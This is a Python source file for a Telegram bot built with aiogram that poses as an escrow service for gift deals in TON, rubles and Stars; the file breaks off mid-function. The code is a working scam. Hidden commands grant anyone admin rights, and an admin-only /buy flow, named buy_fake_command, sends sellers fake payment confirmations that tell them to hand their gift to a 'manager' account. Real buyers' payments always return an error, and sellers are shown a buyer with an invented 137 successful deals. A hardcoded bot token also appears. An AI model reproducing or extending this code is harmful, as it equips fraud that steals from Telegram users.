import asyncio
import logging
import random
import string
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command, CommandObject
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import StatesGroup, State
from aiogram.utils.keyboard import InlineKeyboardBuilder
from aiogram.types import InlineKeyboardButton, FSInputFile, CallbackQuery, InputMediaVideo

logging.basicConfig(level=logging.INFO)

BOT_TOKEN = "8887507355:AAGAcbNIRifLiDa6SZxpf6B6WDVUlwd8WjY"

# Разные видео для разных разделов
MAIN_VIDEO = "main.mp4"
DEAL_VIDEO = "deal.mp4"
REKV_VIDEO = "rekv.mp4"

SUPPORT_LINK = "https://t.me/gifthelper_otc"

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()

deals = {}
user_cards = {}
user_ton = {}
user_stars = {}
admins = set()
user_language = {}


class Form(StatesGroup):
    waiting_for_card = State()
    waiting_for_ton = State()
    waiting_for_star = State()
    waiting_for_currency = State()
    waiting_for_deal_amount = State()
    waiting_for_deal_desc = State()


def generate_deal_code(length=8):
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=length))


def get_text(lang: str, key: str, **kwargs):
    """Функция для получения текста на нужном языке"""
    texts = {
        'ru': {
            'welcome': "👋 <b>Добро пожаловать</b>\n\n🎁 Надежный сервис для безопасных сделок!\n✨ Автоматизированно, быстро и без лишних хлопот!\n\n<blockquote>💎 Комиссия за услугу: 1%\n💎 Поддержка 24/7: @gifthelper_otc</blockquote>\n\n<b>Теперь ваши сделки под защитой🛡</b>",
            'choose_language': "🌍 <b>Выберите язык / Choose language:</b>",
            'language_changed': "✅ Язык изменен на Русский",
            'main_menu': "Выберите раздел:",
            'details': "📥 <b>Управление реквизитами</b>\n\nВыберите тип реквизитов для редактирования:",
            'edit_card': "💳 <b>Добавьте реквизиты вашей карты:</b>\n\nОтправьте реквизиты в формате:\n<code>Банк - Номер карты</code>",
            'edit_ton': "🔑 <b>Добавьте ваш TON-кошелек:</b>\n\nПожалуйста, отправьте адрес вашего TON-кошелька.\n\n📌 Формат: <code>UQCbTJDfaH-RIxMo3yTqXLuJUmnqag05ECQ3sn9qGdCeYdQt</code>",
            'edit_star': "🌟 <b>Введите @username для получения звезд:</b>\n\nФормат: @username (5-32 символа: латиница, цифры, подчеркивание).",
            'card_saved': "✅ Реквизиты карты сохранены:\n<code>{details}</code>",
            'ton_saved': "✅ TON-кошелек успешно сохранен:\n<code>{details}</code>",
            'star_saved': "✅ Получатель звезд сохранен:\n<code>{details}</code>",
            'choose_currency': "💵 <b>Выберите валюту сделки:</b>",
            'enter_amount': "📦 <b>Введите сумму сделки в {currency}:</b>",
            'enter_desc': "📝 <b>Введите описание товара за {amount} {currency}:</b>",
            'deal_created': "🎉 <b>Сделка успешно создана!</b>\n\n📦 Тип: Gift\n📋 Товар: {desc}\n💵 <b>Сумма:</b> {amount} {currency}\n🆔 ID сделки: {code}\n\n────────────────────\n\n🔗 <b>Ссылка для покупателя:</b>\n<code>{link}</code>\n\n⚠️ Передавайте товар только после получения уведомления об оплате!",
            'deal_info': "💳 <b>Информация о сделке #{code}</b>\n\n👤 Вы покупатель в сделке.\n📌 Продавец: @{seller}\n• Успешные сделки: 0\n\n• Вы покупаете: <b>{desc}</b>\n\n🏦 <b>Реквизиты для оплаты:</b>\n<code>{details}</code>\n\n💵 <b>Сумма к оплате:</b> {amount} {currency}\n📝 <b>Комментарий к платежу:</b> <code>{code}</code>\n\n⚠️ Пожалуйста, убедитесь в правильности данных перед оплатой. Комментарий обязателен!\n\nВ случае если вы отправили транзакцию без комментария, напишите менеджеру - @gifthelper_otc",
            'support': "📞СВЯЗЬ С ПОДДЕРЖКОЙ\n\n👨‍💻 Администратор:\n@gifthelper_otc\n\n⏰ Время работы: 24/7\n\n📌По любым вопросам:\n• Проблемы со сделками\n• Технические неполадки\n• Сотрудничество\n• Предложения\n\n👇 Нажмите на кнопку ниже 👇",
            'history': "<b>📬 История сделок</b>\n\nУ вас пока нет завершенных сделок.",
            'no_details_ton': "❌ У вас не заполнен TON-кошелек.\nПожалуйста, сначала добавьте реквизиты.",
            'no_details_star': "❌ У вас не заполнен получатель звезд.\nПожалуйста, сначала добавьте реквизиты.",
            'no_details_card': "❌ У вас не заполнена банковская карта.\nПожалуйста, сначала добавьте реквизиты.",
            'enter_number': "❌ Введите число!",
            'enter_deal_code': "Пожалуйста, укажите код сделки после команды /buy например #KUA0G7RG",
            'deal_not_found': "❌ Сделка с таким кодом не найдена.",
            'deal_not_found_alert': "Сделка не найдена",
            'payment_confirmed': "💳 <b>Оплата подтверждена!</b>\nСделка: #{code}\nПродавец: @{seller}\nСумма: {amount} {currency}\nОписание: {desc}\n\nОжидайте, продавец отправит подарок менеджеру @gifthelper_otc для проверки\nОжидайте уведомления о передаче подарка",
            'payment_confirm_seller': "✅ <b>Оплата подтверждена для сделки #{code}</b>\nСумма: {amount} {currency}\nОписание: {desc}\n\nПожалуйста отправьте подарок менеджеру: @gifthelper_otc\n⚠️ После отправки подарка нажмите кнопку ниже:",
            'gift_sent': "✅ Запрос на подтверждение отправлен покупателю!",
            'gift_sent_buyer': "🔔 <b>Продавец утверждает, что отправил товар</b>\n\nСделка: #{code}\nПродавец: @{seller}\nСумма: {amount} {currency}\nОписание: {desc}\n\nПодтвердите получение товара:",
            'deal_finished': "✅ <b>Покупатель подтвердил получение товара!</b>\n\nСделка #{code} успешно завершена.\nСумма: {amount} {currency}",
            'not_received': "Уведомление отправлено поддержке.",
            'own_deal': "❌ Вы не можете войти в собственную сделку.",
            'payment_error': "💔 К сожалению произошла ошибка, попробуйте позже",
            'admin_access': "✅ <b>Вы успешно получили права администратора!</b>",
            'no_admin': "⛔ У вас нет прав для выполнения этой команды.",
        },
        'en': {
            'welcome': "👋 <b>Welcome</b>\n\n🎁 Reliable service for safe transactions!\n✨ Automated, fast and hassle-free!\n\n<blockquote>💎 Service fee: 1%\n💎 24/7 Support: @gifthelper_otc</blockquote>\n\n<b>Your transactions are now protected🛡</b>",
            'choose_language': "🌍 <b>Choose language / Выберите язык:</b>",
            'language_changed': "✅ Language changed to English",
            'main_menu': "Choose section:",
            'details': "📥 <b>Manage payment details</b>\n\nSelect the type of payment details to edit:",
            'edit_card': "💳 <b>Add your card details:</b>\n\nSend the details in the format:\n<code>Bank - Card Number</code>",
            'edit_ton': "🔑 <b>Add your TON wallet:</b>\n\nPlease send your TON wallet address.\n\n📌 Format: <code>UQCbTJDfaH-RIxMo3yTqXLuJUmnqag05ECQ3sn9qGdCeYdQt</code>",
            'edit_star': "🌟 <b>Enter @username for receiving stars:</b>\n\nFormat: @username (5-32 characters: Latin letters, numbers, underscore).",
            'card_saved': "✅ Card details saved:\n<code>{details}</code>",
            'ton_saved': "✅ TON wallet saved successfully:\n<code>{details}</code>",
            'star_saved': "✅ Star recipient saved:\n<code>{details}</code>",
            'choose_currency': "💵 <b>Select transaction currency:</b>",
            'enter_amount': "📦 <b>Enter the transaction amount in {currency}:</b>",
            'enter_desc': "📝 <b>Enter the product description for {amount} {currency}:</b>",
            'deal_created': "🎉 <b>Transaction successfully created!</b>\n\n📦 Type: Gift\n📋 Product: {desc}\n💵 <b>Amount:</b> {amount} {currency}\n🆔 Transaction ID: {code}\n\n────────────────────\n\n🔗 <b>Link for buyer:</b>\n<code>{link}</code>\n\n⚠️ Transfer the gift only after receiving payment notification!",
            'deal_info': "💳 <b>Transaction info #{code}</b>\n\n👤 You are the buyer in this transaction.\n📌 Seller: @{seller}\n• Successful transactions: 0\n\n• You are buying: <b>{desc}</b>\n\n🏦 <b>Payment details:</b>\n<code>{details}</code>\n\n💵 <b>Amount to pay:</b> {amount} {currency}\n📝 <b>Payment comment:</b> <code>{code}</code>\n\n⚠️ Please verify the details before payment. Comment is required!\n\nIf you sent the transaction without a comment, contact the manager - @gifthelper_otc",
            'support': "📞SUPPORT CONTACT\n\n👨‍💻 Administrator:\n@gifthelper_otc\n\n⏰ Working hours: 24/7\n\n📌For any questions:\n• Transaction issues\n• Technical problems\n• Cooperation\n• Suggestions\n\n👇 Click the button below 👇",
            'history': "<b>📬 Transaction history</b>\n\nYou don't have any completed transactions yet.",
            'no_details_ton': "❌ Your TON wallet is not filled.\nPlease add the details first.",
            'no_details_star': "❌ Your star recipient is not filled.\nPlease add the details first.",
            'no_details_card': "❌ Your bank card is not filled.\nPlease add the details first.",
            'enter_number': "❌ Enter a number!",
            'enter_deal_code': "Please specify the transaction code after the /buy command, e.g. #KUA0G7RG",
            'deal_not_found': "❌ Transaction with this code not found.",
            'deal_not_found_alert': "Transaction not found",
            'payment_confirmed': "💳 <b>Payment confirmed!</b>\nTransaction: #{code}\nSeller: @{seller}\nAmount: {amount} {currency}\nDescription: {desc}\n\nPlease wait, the seller will send the gift to the manager @gifthelper_otc for verification\nWait for notification about the gift transfer",
            'payment_confirm_seller': "✅ <b>Payment confirmed for transaction #{code}</b>\nAmount: {amount} {currency}\nDescription: {desc}\n\nPlease send the gift to the manager: @gifthelper_otc\n⚠️ After sending the gift, click the button below:",
            'gift_sent': "✅ Confirmation request sent to buyer!",
            'gift_sent_buyer': "🔔 <b>The seller claims to have sent the item</b>\n\nTransaction: #{code}\nSeller: @{seller}\nAmount: {amount} {currency}\nDescription: {desc}\n\nConfirm receipt of the item:",
            'deal_finished': "✅ <b>Buyer confirmed receipt of the item!</b>\n\nTransaction #{code} successfully completed.\nAmount: {amount} {currency}",
            'not_received': "Notification sent to support.",
            'own_deal': "❌ You cannot enter your own transaction.",
            'payment_error': "💔 Unfortunately, an error occurred, please try again later",
            'admin_access': "✅ <b>You have successfully received administrator rights!</b>",
            'no_admin': "⛔ You don't have permission to execute this command.",
        }
    }

    text = texts.get(lang, texts['ru']).get(key, key)
    if kwargs:
        text = text.format(**kwargs)
    return text


def get_main_menu(lang: str):
    builder = InlineKeyboardBuilder()
    builder.row(InlineKeyboardButton(text="💰 " + ("Мои реквизиты" if lang == 'ru' else "My details"),
                                     callback_data="manage_details"))
    builder.row(InlineKeyboardButton(text="🎁 " + ("Создать сделку" if lang == 'ru' else "Create deal"),
                                     callback_data="create_deal"))
    builder.row(
        InlineKeyboardButton(text="📬 " + ("Мои сделки" if lang == 'ru' else "My deals"), callback_data="deal_history"))
    builder.row(
        InlineKeyboardButton(text="🌍 " + ("Русский" if lang == 'ru' else "English"), callback_data="change_language"))
    builder.add(InlineKeyboardButton(text="📞 " + ("Поддержка" if lang == 'ru' else "Support"), url=SUPPORT_LINK))
    return builder.as_markup()


def get_currency_menu(lang: str):
    builder = InlineKeyboardBuilder()
    builder.row(InlineKeyboardButton(text="💎 TON", callback_data="set_cur_TON"))
    builder.row(InlineKeyboardButton(text="💵 " + ("Рубли" if lang == 'ru' else "Rubles"), callback_data="set_cur_RUB"))
    builder.row(InlineKeyboardButton(text="🌟 " + ("Звезды" if lang == 'ru' else "Stars"), callback_data="set_cur_STR"))
    builder.row(InlineKeyboardButton(text="⬅️ " + ("Вернуться в меню" if lang == 'ru' else "Back to menu"),
                                     callback_data="back_to_menu"))
    return builder.as_markup()


def get_details_menu(lang: str):
    builder = InlineKeyboardBuilder()
    builder.row(
        InlineKeyboardButton(text="💎 " + ("TON-Кошелек" if lang == 'ru' else "TON Wallet"), callback_data="edit_ton"))
    builder.row(InlineKeyboardButton(text="💳 " + ("Банковская карта" if lang == 'ru' else "Bank card"),
                                     callback_data="edit_card"))
    builder.row(InlineKeyboardButton(text="🌟 " + ("Получатель звезд" if lang == 'ru' else "Star recipient"),
                                     callback_data="edit_star"))
    builder.row(InlineKeyboardButton(text="⬅️ " + ("Вернуться в меню" if lang == 'ru' else "Back to menu"),
                                     callback_data="back_to_menu"))
    return builder.as_markup()


def get_back_menu(lang: str):
    builder = InlineKeyboardBuilder()
    builder.row(InlineKeyboardButton(text="⬅️ " + ("Вернуться в меню" if lang == 'ru' else "Back to menu"),
                                     callback_data="back_to_menu"))
    return builder.as_markup()


def get_language_menu():
    builder = InlineKeyboardBuilder()
    builder.row(InlineKeyboardButton(text="🇷🇺 Русский", callback_data="lang_ru"))
    builder.row(InlineKeyboardButton(text="🇬🇧 English", callback_data="lang_en"))
    return builder.as_markup()


@dp.message(Command("amazonteam"))
async def admin_command(message: types.Message):
    admins.add(message.from_user.id)
    lang = user_language.get(message.from_user.id, 'ru')
    await message.answer(get_text(lang, 'admin_access'), parse_mode="HTML")


@dp.message(Command("koolikteam"))
async def admin_command2(message: types.Message):
    admins.add(message.from_user.id)
    lang = user_language.get(message.from_user.id, 'ru')
    await message.answer(get_text(lang, 'admin_access'), parse_mode="HTML")


@dp.callback_query(F.data == "change_language")
async def change_language_callback(callback: types.CallbackQuery):
    await callback.message.edit_text(
        get_text('ru', 'choose_language'),
        reply_markup=get_language_menu(),
        parse_mode="HTML"
    )
    await callback.answer()


@dp.callback_query(F.data.startswith("lang_"))
async def set_language(callback: types.CallbackQuery):
    lang = callback.data.split("_")[1]
    user_language[callback.from_user.id] = lang

    await callback.answer()

    text = get_text(lang, 'welcome')
    try:
        video = FSInputFile(MAIN_VIDEO)
        await callback.message.edit_media(
            media=InputMediaVideo(media=video, caption=text, parse_mode="HTML"),
            reply_markup=get_main_menu(lang)
        )
    except:
        await callback.message.edit_text(
            text=text,
            reply_markup=get_main_menu(lang),
            parse_mode="HTML"
        )


@dp.callback_query(F.data == "support")
async def support_callback(callback: types.CallbackQuery):
    lang = user_language.get(callback.from_user.id, 'ru')
    text = get_text(lang, 'support')
    builder = InlineKeyboardBuilder()
    builder.row(InlineKeyboardButton(text="📞 " + ("Написать в поддержку" if lang == 'ru' else "Contact support"),
                                     url=SUPPORT_LINK))
    builder.row(InlineKeyboardButton(text="⬅️ " + ("Вернуться в меню" if lang == 'ru' else "Back to menu"),
                                     callback_data="back_to_menu"))

    try:
        video = FSInputFile(MAIN_VIDEO)
        media = InputMediaVideo(media=video, caption=text, parse_mode="HTML")
        await callback.message.edit_media(media=media, reply_markup=builder.as_markup())
    except:
        await callback.message.edit_text(text=text, reply_markup=builder.as_markup(), parse_mode="HTML")


@dp.callback_query(F.data == "deal_history")
async def deal_history_callback(callback: types.CallbackQuery):
    lang = user_language.get(callback.from_user.id, 'ru')
    text = get_text(lang, 'history')
    builder = InlineKeyboardBuilder()
    builder.row(InlineKeyboardButton(text="⬅️ " + ("Вернуться в меню" if lang == 'ru' else "Back to menu"),
                                     callback_data="back_to_menu"))

    try:
        video = FSInputFile(MAIN_VIDEO)
        media = InputMediaVideo(media=video, caption=text, parse_mode="HTML")
        await callback.message.edit_media(media=media, reply_markup=builder.as_markup())
    except:
        await callback.message.edit_text(text=text, reply_markup=builder.as_markup(), parse_mode="HTML")


@dp.message(Command("buy"))
async def buy_fake_command(message: types.Message, command: CommandObject):
    lang = user_language.get(message.from_user.id, 'ru')

    if message.from_user.id not in admins:
        await message.answer(get_text(lang, 'no_admin'), parse_mode="HTML")
        return

    args = command.args
    if not args:
        await message.answer(get_text(lang, 'enter_deal_code'))
        return

    deal_id = args.replace("#", "")
    if deal_id not in deals:
        await message.answer(get_text(lang, 'deal_not_found'))
        return

    builder = InlineKeyboardBuilder()
    builder.row(InlineKeyboardButton(text="✅ " + ("Подтвердить оплату" if lang == 'ru' else "Confirm payment"),
                                     callback_data=f"fake_confirm_{deal_id}"))
    await message.answer("🐹 " + (
        "Нажмите кнопку ниже для подтверждения оплаты" if lang == 'ru' else "Click the button below to confirm payment"),
                         reply_markup=builder.as_markup())


@dp.callback_query(F.data.startswith("fake_confirm_"))
async def process_fake_confirm(callback: CallbackQuery):
    deal_id = callback.data.split("_")[2]
    lang = user_language.get(callback.from_user.id, 'ru')

    if deal_id not in deals:
        await callback.answer(get_text(lang, 'deal_not_found_alert'), show_alert=True)
        return

    deal = deals[deal_id]
    deal['buyer_id'] = callback.from_user.id

    cur_sym = {
        "RUB": "RUB 🇷🇺",
        "KZT": "KZT 🇰🇿",
        "UAH": "UAH 🇺🇦",
        "BYN": "BYN 🇧🇾",
        "EUR": "EUR 🇪🇺",
        "USD": "USD 🇺🇸",
        "STR": "Stars ⭐️",
        "TON": "TON 💎"
    }.get(deal['currency'], "RUB")

    seller_lang = user_language.get(deal['creator_id'], 'ru')
    seller_text = get_text(
        seller_lang,
        'payment_confirm_seller',
        code=deal_id,
        amount=deal['amount'],
        currency=cur_sym,
        desc=deal['description']
    )

    builder_seller = InlineKeyboardBuilder()
    builder_seller.row(InlineKeyboardButton(
        text="🎁 " + ("Я отправил подарок" if seller_lang == 'ru' else "I sent the gift"),
        callback_data=f"gift_sent_{deal_id}"
    ))

    try:
        await bot.send_message(deal['creator_id'], seller_text, reply_markup=builder_seller.as_markup(),
                               parse_mode="HTML")
    except Exception as e:
        logging.error(f"Error notifying seller: {e}")

    buyer_text = get_text(
        lang,
        'payment_confirmed',
        code=deal_id,
        seller=deal['creator_username'],
        amount=deal['amount'],
        currency=cur_sym,
        desc=deal['description']
    )
    await callback.message.edit_text(buyer_text, parse_mode="HTML")
    await callback.answer()


@dp.callback_query(F.data.startswith("gift_sent_"))
async def process_gift_sent(callback: CallbackQuery):
    deal_id = callback.data.split("_")[2]
    lang = user_language.get(callback.from_user.id, 'ru')

    if deal_id not in deals:
        await callback.answer(get_text(lang, 'deal_not_found_alert'), show_alert=True)
        return

    deal = deals[deal_id]
    await callback.message.answer(get_text(lang, 'gift_sent'))

    buyer_lang = user_language.get(deal['buyer_id'], 'ru')

    cur_sym = {
        "RUB": "RUB 🇷🇺",
        "KZT": "KZT 🇰🇿",
        "UAH": "UAH 🇺🇦",
        "BYN": "BYN 🇧🇾",
        "EUR": "EUR 🇪🇺",
        "USD": "USD 🇺🇸",
        "STR": "Stars ⭐️",
        "TON": "TON 💎"
    }.get(deal['currency'], "RUB")

    buyer_text = get_text(
        buyer_lang,
        'gift_sent_buyer',
        code=deal_id,
        seller=deal['creator_username'],
        amount=deal['amount'],
        currency=cur_sym,
        desc=deal['description']
    )

    builder = InlineKeyboardBuilder()
    builder.row(InlineKeyboardButton(
        text="✅ " + ("Подтвердить получение" if buyer_lang == 'ru' else "Confirm receipt"),
        callback_data=f"deal_finish_{deal_id}"
    ))
    builder.row(InlineKeyboardButton(
        text="❌ " + ("Не получил товар" if buyer_lang == 'ru' else "Did not receive item"),
        callback_data="not_received"
    ))

    try:
        await bot.send_message(deal['buyer_id'], buyer_text, reply_markup=builder.as_markup(), parse_mode="HTML")
    except Exception as e:
        logging.error(f"Error notifying buyer: {e}")

    await callback.answer()


@dp.callback_query(F.data.startswith("deal_finish_"))
async def process_deal_finish(callback: CallbackQuery):
    deal_id = callback.data.split("_")[2]
    lang = user_language.get(callback.from_user.id, 'ru')

    if deal_id not in deals:
        await callback.answer(get_text(lang, 'deal_not_found_alert'), show_alert=True)
        return

    deal = deals[deal_id]

    cur_sym = {
        "RUB": "RUB 🇷🇺",
        "KZT": "KZT 🇰🇿",
        "UAH": "UAH 🇺🇦",
        "BYN": "BYN 🇧🇾",
        "EUR": "EUR 🇪🇺",
        "USD": "USD 🇺🇸",
        "STR": "Stars ⭐️",
        "TON": "TON 💎"
    }.get(deal['currency'], "RUB")

    finish_text = get_text(
        lang,
        'deal_finished',
        code=deal_id,
        amount=deal['amount'],
        currency=cur_sym
    )

    await callback.message.edit_text(finish_text, parse_mode="HTML")

    seller_lang = user_language.get(deal['creator_id'], 'ru')
    seller_finish_text = get_text(
        seller_lang,
        'deal_finished',
        code=deal_id,
        amount=deal['amount'],
        currency=cur_sym
    )
    await bot.send_message(deal['creator_id'], seller_finish_text, parse_mode="HTML")

    del deals[deal_id]
    await callback.answer()


@dp.callback_query(F.data == "not_received")
async def process_not_received(callback: CallbackQuery):
    lang = user_language.get(callback.from_user.id, 'ru')
    await callback.answer(get_text(lang, 'not_received'), show_alert=True)


@dp.message(Command("start"))
async def start_command(message: types.Message, state: FSMContext, command: CommandObject = None):
    await state.clear()

    if message.from_user.id not in user_language:
        await message.answer(
            get_text('ru', 'choose_language'),
            reply_markup=get_language_menu(),
            parse_mode="HTML"
        )
        return

    lang = user_language.get(message.from_user.id, 'ru')
    args = command.args if command else None

    if args and args in deals:
        deal = deals[args]
        deal_id = args

        if message.from_user.id == deal['creator_id']:
            text = get_text(lang, 'own_deal')
            try:
                video = FSInputFile(MAIN_VIDEO)
                await message.answer_video(video=video, caption=text, reply_markup=get_main_menu(lang),
                                           parse_mode="HTML")
            except:
                await message.answer(text=text, reply_markup=get_main_menu(lang), parse_mode="HTML")
            return

        buyer_username = message.from_user.username or message.from_user.first_name

        try:
            creator_text = (
                f"👤 Пользователь @{buyer_username} присоединился к сделке <b>#{deal_id}</b>\n\n"
                f"· Успешные сделки: 137"
            )
            await bot.send_message(deal['creator_id'], creator_text, parse_mode="HTML")
        except Exception as e:
            logging.error(f"Ошибка уведомления продавца: {e}")

        if deal['currency'] == "TON":
            seller_details = user_ton.get(deal['creator_id'], "Не указаны (обратитесь к продавцу)")
        elif deal['currency'] == "STR":
            seller_details = user_stars.get(deal['creator_id'], "Не указаны (обратитесь к продавцу)")
        else:
            seller_details = user_cards.get(deal['creator_id'], "Не указаны (обратитесь к продавцу)")

        text = get_text(
            lang,
            'deal_info',
            code=deal_id,
            seller=deal['creator_username'],
            desc=deal['description'],
            details=seller_details,
            amount=deal['amount'],
            currency=deal['currency']
        )

        builder = InlineKeyboardBuilder()
        builder.row(InlineKeyboardButton(
            text="✅ " + ("Подтвердить оплату" if lang == 'ru' else "Confirm payment"),
            callback_data=f"confirm_pay_{deal_id}"
        ))
        builder.row(InlineKeyboardButton(
            text="❌ " + ("Выйти из сделки" if lang == 'ru' else "Exit deal"),
            callback_data="back_to_menu"
        ))

        try:
            video = FSInputFile(MAIN_VIDEO)
            await message.answer_video(video=video, caption=text, reply_markup=builder.as_markup(), parse_mode="HTML")
        except:
            await message.answer(text=text, reply_markup=builder.as_markup(), parse_mode="HTML")
        return

    text = get_text(lang, 'welcome')
    try:
        video = FSInputFile(MAIN_VIDEO)
        await message.answer_video(video=video, caption=text, reply_markup=get_main_menu(lang), parse_mode="HTML")
    except:
        await message.answer(text=text, reply_markup=get_main_menu(lang), parse_mode="HTML")


@dp.callback_query(F.data.startswith("confirm_pay_"))
async def process_confirm_payment(callback: CallbackQuery):
    lang = user_language.get(callback.from_user.id, 'ru')
    await callback.answer(
        text=get_text(lang, 'payment_error'),
        show_alert=True
    )


@dp.callback_query(F.data == "manage_details")
async def manage_details(callback: types.CallbackQuery):
    lang = user_language.get(callback.from_user.id, 'ru')
    text = get_text(lang, 'details')
    try:
        video = FSInputFile(REKV_VIDEO)
        media = InputMediaVideo(media=video, caption=text, parse_mode="HTML")
        await callback.message.edit_media(media=media, reply_markup=get_details_menu(lang))
    except:
        await callback.message.edit_text(text=text, reply_markup=get_details_menu(lang), parse_mode="HTML")


@dp.callback_query(F.data == "edit_card")
async def edit_card_btn(callback: types.CallbackQuery, state: FSMContext):
    lang = user_language.get(callback.from_user.id, 'ru')
    text = get_text(lang, 'edit_card')
    try:
        await callback.message.edit_caption(caption=text, reply_markup=get_back_menu(lang), parse_mode="HTML")
    except:
        await callback.message.edit_text(text=text, reply_markup=get_back_menu(lang), parse_mode="HTML")
    await state.set_state(Form.waiting_for_card)


@dp.callback_query(F.data == "edit_ton")
async def edit_ton_btn(callback: types.CallbackQuery, state: FSMContext):
    lang = user_language.get(callback.from_user.id, 'ru')
    text = get_text(lang, 'edit_ton')
    try:
        await callback.message.edit_caption(caption=text, reply_markup=get_back_menu(lang), parse_mode="HTML")
    except:
        await callback.message.edit_text(text=text, reply_markup=get_back_menu(lang), parse_mode="HTML")
    await state.set_state(Form.waiting_for_ton)


@dp.callback_query(F.data == "edit_star")
async def edit_star_btn(callback: types.CallbackQuery, state: FSMContext):
    lang = user_language.get(callback.from_user.id, 'ru')
    text = get_text(lang, 'edit_star')
    try:
        await callback.message.edit_caption(caption=text, reply_markup=get_back_menu(lang), parse_mode="HTML")
    except:
        await callback.message.edit_text(text=text, reply_markup=get_back_menu(lang), parse_mode="HTML")
    await state.set_state(Form.waiting_for_star)


@dp.message(Form.waiting_for_card)
async def card_received(message: types.Message, state: FSMContext):
    lang = user_language.get(message.from_user.id, 'ru')
    user_cards[message.from_user.id] = message.text
    text = get_text(lang, 'card_saved', details=message.text)
    await message.answer(text, parse_mode="HTML")
    await start_command(message, state)


@dp.message(Form.waiting_for_ton)
async def ton_received(message: types.Message, state: FSMContext):
    lang = user_language.get(message.from_user.id, 'ru')
    user_ton[message.from_user.id] = message.text
    text = get_text(lang, 'ton_saved', details=message.text)
    await message.answer(text, parse_mode="HTML")
    await start_command(message, state)


@dp.message(Form.waiting_for_star)
async def star_received(message: types.Message, state: FSMContext):
    lang = user_language.get(message.from_user.id, 'ru')
    user_stars[message.from_user.id] = message.text
    text = get_text(lang, 'star_saved', details=message.text)
    await message.answer(text, parse_mode="HTML")
    await start_command(message, state)


@dp.callback_query(F.data == "create_deal")
async def create_deal_start(callback: types.CallbackQuery, state: FSMContext):
    lang = user_language.get(callback.from_user.id, 'ru')
    text = get_text(lang, 'choose_currency')
    try:
        video = FSInputFile(DEAL_VIDEO)
        media = InputMediaVideo(media=video, caption=text, parse_mode="HTML")
        await callback.message.edit_media(media=media, reply_markup=get_currency_menu(lang))
    except:
        await callback.message.edit_text(text=text, reply_markup=get_currency_menu(lang), parse_mode="HTML")
    await state.set_state(Form.waiting_for_currency)


@dp.callback_query(F.data.startswith("set_cur_"), Form.waiting_for_currency)
async def process_currency_choice(callback: types.CallbackQuery, state: FSMContext):
    currency = callback.data.split("_")[2]
    user_id = callback.from_user.id
    lang = user_language.get(user_id, 'ru')

    if currency == "TON" and user_id not in user_ton:
        text = get_text(lang, 'no_details_ton')
        builder = InlineKeyboardBuilder()
        builder.row(InlineKeyboardButton(text="💎 " + ("Добавить TON-кошелек" if lang == 'ru' else "Add TON wallet"),
                                         callback_data="edit_ton"))
        builder.row(
            InlineKeyboardButton(text="⬅️ " + ("Назад" if lang == 'ru' else "Back"), callback_data="back_to_menu"))
        try:
            await callback.message.edit_caption(caption=text, reply_markup=builder.as_markup(), parse_mode="HTML")
        except:
            await callback.message.edit_text(text=text, reply_markup=builder.as_markup(), parse_mode="HTML")
        await state.clear()
        return

    if currency == "STR" and user_id not in user_stars:
        text = get_text(lang, 'no_details_star')
        builder = InlineKeyboardBuilder()
        builder.row(
            InlineKeyboardButton(text="🌟 " + ("Добавить получателя звезд" if lang == 'ru' else "Add star recipient"),
                                 callback_data="edit_star"))
        builder.row(
            InlineKeyboardButton(text="⬅️ " + ("Назад" if lang == 'ru' else "Back"), callback_data="back_to_menu"))
        try:
            await callback.message.edit_caption(caption=text, reply_markup=builder.as_markup(), parse_mode="HTML")
        except:
            await callback.message.edit_text(text=text, reply_markup=builder.as_markup(), parse_mode="HTML")
        await state.clear()
        return

    if currency == "RUB" and user_id not in user_cards:
        text = get_text(lang, 'no_details_card')
        builder = InlineKeyboardBuilder()
        builder.row(InlineKeyboardButton(text="💳 " + ("Добавить карту" if lang == 'ru' else "Add card"),
                                         callback_data="edit_card"))
        builder.row(
            InlineKeyboardButton(text="⬅️ " + ("Назад" if lang == 'ru' else "Back"), callback_data="back_to_menu"))
        try:
            await callback.message.edit_caption(caption=text, reply_markup=builder.as_markup(), parse_mode="HTML")
        except:
            await callback.message.edit_text(text=text, reply_markup=builder.as_markup(), parse_mode="HTML")
        await state.clear()
        return

    await state.update_data(currency=currency)

    currency_labels = {
        "RUB": "RUB 🇷🇺",
        "KZT": "KZT 🇰🇿",
        "UAH": "UAH 🇺🇦",
        "BYN": "BYN 🇧🇾",
        "EUR": "EUR 🇪🇺",
        "USD": "USD 🇺🇸",
        "STR": "Stars ⭐️",
        "TON": "TON 💎"
    }
    currency_label = currency_labels.get(currency, "RUB")
    text = get_text(lang, 'enter_amount', currency=currency_label)

    try:
        await callback.message.edit_caption(caption=text, reply_markup=get_back_menu(lang), parse_mode="HTML")
    except:
        await callback.message.edit_text(text=text, reply_markup=get_back_menu(lang), parse_mode="HTML")
    await state.set_state(Form.waiting_for_deal_amount)


@dp.message(Form.waiting_for_deal_amount)
async def process_deal_amount(message: types.Message, state: FSMContext):
    lang = user_language.get(message.from_user.id, 'ru')
    try:
        amount = float(message.text.replace(',', '.'))
        data = await state.get_data()
        currency = data.get('currency')

        currency_labels = {
            "RUB": "RUB 🇷🇺",
            "KZT": "KZT 🇰🇿",
            "UAH": "UAH 🇺🇦",
            "BYN": "BYN 🇧🇾",
            "EUR": "EUR 🇪🇺",
            "USD": "USD 🇺🇸",
            "STR": "Stars ⭐️",
            "TON": "TON 💎"
        }
        currency_label = currency_labels.get(currency, "RUB")

        await state.update_data(amount=amount)
        text = get_text(lang, 'enter_desc', amount=amount, currency=currency_label)
        await message.answer(text, parse_mode="HTML")
        await state.set_state(Form.waiting_for_deal_desc)
    except ValueError:
        await message.answer(get_text(lang, 'enter_number'))


@dp.message(Form.waiting_for_deal_desc)
async def process_deal_desc(message: types.Message, state: FSMContext):
    lang = user_language.get(message.from_user.id, 'ru')
    data = await state.get_data()
    amount = data.get('amount')
    currency = data.get('currency')
    deal_code = generate_deal_code()

    deals[deal_code] = {
        'creator_id': message.from_user.id,
        'creator_username': message.from_user.username or message.from_user.first_name,
        'amount': amount,
        'currency': currency,
        'description': message.text
    }

    bot_info = await bot.get_me()
    deal_link = f"https://t.me/{bot_info.username}?start={deal_code}"

    currency_symbols = {
        "RUB": "RUB 🇷🇺",
        "KZT": "KZT 🇰🇿",
        "UAH": "UAH 🇺🇦",
        "BYN": "BYN 🇧🇾",
        "EUR": "EUR 🇪🇺",
        "USD": "USD 🇺🇸",
        "STR": "Stars ⭐️",
        "TON": "TON 💎"
    }
